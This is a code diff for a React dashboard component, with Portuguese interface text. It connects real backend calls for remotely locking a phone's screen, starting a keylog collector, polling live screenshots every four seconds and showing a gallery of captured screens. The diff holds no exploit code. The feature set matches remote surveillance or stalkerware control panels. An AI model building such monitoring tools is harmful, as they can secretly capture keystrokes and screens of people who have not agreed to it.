@@ -1,9 +1,8 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import LockedScreen from "@/components/LockedScreen";
-import PhoneFrame from "@/components/PhoneFrame";
 import { trpc } from "@/lib/trpc";
 
 interface DeviceDetailsProps {
@@ -56,32 +55,56 @@ export default function DeviceDetails({
     },
   });
 
+  const lockMutation = trpc.screenLock.lock.useMutation({
+    onSuccess: () => {
+      setIsScreenLocked(true);
+    },
+  });
+
+  const unlockMutation = trpc.screenLock.unlock.useMutation({
+    onSuccess: () => {
+      setIsScreenLocked(false);
+    },
+  });
+
+  const startSimulatorMutation = trpc.keylogs.startSimulator.useMutation({
+    onSuccess: () => {
+      alert("⌨️ Simulador de keylogs iniciado!");
+      refetchKeylogs();
+    },
+  });
+
+  // Latest screenshot for live view
+  const { data: latestScreenshot, refetch: refetchScreenshot } = trpc.device.latestScreenshot.useQuery(
+    { deviceId: Number(deviceId) },
+    { refetchInterval: isLiveActive ? 4000 : false, enabled: isLiveActive }
+  );
+
+  // All screenshots for the screenshots tab
+  const { data: allScreenshots = [] } = trpc.device.screenshots.useQuery(
+    { deviceId: Number(deviceId), limit: 20 },
+    { refetchInterval: 8000 }
+  );
+
   const handleScreenshot = () => {
-    alert(`📸 Screenshot capturado de ${deviceName}`);
+    refetchScreenshot();
+    alert(`📸 Atualizando screenshot de ${deviceName}`);
   };
 
   const handleStopLive = () => {
     setIsLiveActive(false);
-    alert("⏹️ Visualização ao vivo parada");
   };
 
   const handleActivateControl = () => {
     setIsControlActive(!isControlActive);
-    alert(
-      isControlActive
-        ? "🎮 Controle desativado"
-        : "🎮 Controle remoto ativado"
-    );
   };
 
   const handleLockScreen = () => {
-    setIsScreenLocked(true);
-    alert("🔒 Tela travada! Digite a senha para destravar.");
+    lockMutation.mutate({ deviceId: Number(deviceId) });
   };
 
   const handleUnlockScreen = () => {
-    setIsScreenLocked(false);
-    alert("🔓 Tela desbloqueada com sucesso!");
+    unlockMutation.mutate({ deviceId: Number(deviceId) });
   };
 
   const handleRemoveDevice = () => {
@@ -314,14 +337,27 @@ export default function DeviceDetails({
         {/* Aba: Screenshots */}
         <TabsContent value="screenshots" className="space-y-4">
           <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">📸 Screenshots Capturados (6)</h3>
-            <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
-              {[1, 2, 3, 4, 5, 6].map((i) => (
-                <div key={i} className="bg-slate-700 rounded-lg aspect-video flex items-center justify-center border border-slate-600 hover:border-cyan-500 transition cursor-pointer">
-                  <p className="text-slate-400">📱 Screenshot {i}</p>
-                </div>
-              ))}
-            </div>
+            <h3 className="text-cyan-400 font-bold mb-4">📸 Screenshots Capturados ({allScreenshots.length})</h3>
+            {allScreenshots.length === 0 ? (
+              <p className="text-slate-400 text-center py-8">Nenhum screenshot capturado ainda</p>
+            ) : (
+              <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
+                {allScreenshots.map((s) => (
+                  <div key={s.id} className="rounded-lg overflow-hidden border border-slate-600 hover:border-cyan-500 transition cursor-pointer">
+                    <img
+                      src={s.screenshotUrl}
+                      alt="Screenshot"
+                      className="w-full object-contain bg-black"
+                      style={{ maxHeight: "200px" }}
+                      onClick={() => window.open(s.screenshotUrl, "_blank")}
+                    />
+                    <p className="text-slate-500 text-xs text-center py-1 bg-slate-700">
+                      {new Date(s.createdAt).toLocaleTimeString("pt-BR")}
+                    </p>
+                  </div>
+                ))}
+              </div>
+            )}
           </Card>
         </TabsContent>
 
@@ -414,11 +450,47 @@ export default function DeviceDetails({
       {isLiveActive && (
         <div className="mt-8">
           <Card className="bg-slate-800 border-slate-700 p-6">
-            <h3 className="text-cyan-400 font-bold mb-4">
-              🔴 Visualização Ao Vivo
-            </h3>
-            <div className="flex justify-center py-8">
-              <PhoneFrame status="Transmissão ao vivo do dispositivo" />
+            <div className="flex items-center justify-between mb-4">
+              <h3 className="text-cyan-400 font-bold">
+                🔴 Visualização Ao Vivo
+                <span className="ml-2 text-xs text-slate-400 font-normal">atualiza a cada 4s</span>
+              </h3>
+              <Button
+                onClick={() => refetchScreenshot()}
+                className="bg-cyan-700 hover:bg-cyan-600 text-white text-sm"
+              >
+                🔄 Atualizar
+              </Button>
+            </div>
+            <div className="flex justify-center">
+              {latestScreenshot?.screenshotUrl ? (
+                <div className="relative" style={{ width: "360px" }}>
+                  {/* Moldura do celular */}
+                  <div className="bg-gradient-to-b from-slate-900 to-slate-800 rounded-3xl border-8 border-slate-900 p-2 shadow-2xl">
+                    <div className="h-5 bg-black rounded-b-3xl mx-auto w-32 mb-1"></div>
+                    <div className="rounded-2xl overflow-hidden bg-black">
+                      <img
+                        src={latestScreenshot.screenshotUrl}
+                        alt="Screenshot ao vivo"
+                        className="w-full object-contain"
+                        style={{ maxHeight: "640px" }}
+                      />
+                    </div>
+                    <div className="h-6 flex items-center justify-center mt-1">
+                      <div className="w-16 h-1 bg-slate-700 rounded-full"></div>
+                    </div>
+                  </div>
+                  <p className="text-center text-slate-500 text-xs mt-2">
+                    Capturado: {new Date(latestScreenshot.createdAt).toLocaleTimeString("pt-BR")}
+                  </p>
+                </div>
+              ) : (
+                <div className="flex flex-col items-center justify-center py-16 text-slate-400">
+                  <div className="text-5xl mb-4">📱</div>
+                  <p className="text-sm">Aguardando screenshot do dispositivo...</p>
+                  <p className="text-xs text-slate-500 mt-1">O celular enviará capturas automaticamente</p>
+                </div>
+              )}
             </div>
           </Card>
         </div>
